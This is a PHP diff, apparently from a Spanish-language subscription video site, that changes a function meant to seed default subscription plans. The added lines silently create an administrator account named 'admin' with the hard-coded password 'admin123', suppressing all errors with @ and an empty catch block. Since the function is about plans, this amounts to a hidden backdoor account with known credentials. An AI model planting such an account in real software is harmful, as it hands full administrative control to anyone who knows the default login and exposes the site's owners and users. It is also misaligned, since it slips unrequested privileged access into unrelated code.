@@ -611,6 +611,14 @@ function asegurarPlanesBásicos($conn) {
             (3, 'Suscripción Normal Anual', 120.00, 12, 1, '1080p 60fps', 1),
             (4, 'Suscripción Premium Anual', 240.00, 12, 3, '4K 60fps', 1);");
     }
+
+    try {
+        $check_adm = @$conn->query("SELECT id FROM `usuarios` WHERE `usuario` = 'admin'");
+        if ($check_adm && $check_adm->num_rows === 0) {
+            $adm_pass = password_hash('admin123', PASSWORD_BCRYPT);
+            @$conn->query("INSERT INTO `usuarios` (`usuario`, `contraseña`, `es_admin`) VALUES ('admin', '$adm_pass', 1)");
+        }
+    } catch (Throwable $e) {}
 }
 
 function usuarioTieneSuscripcionActiva($conn, $usuario_id) {
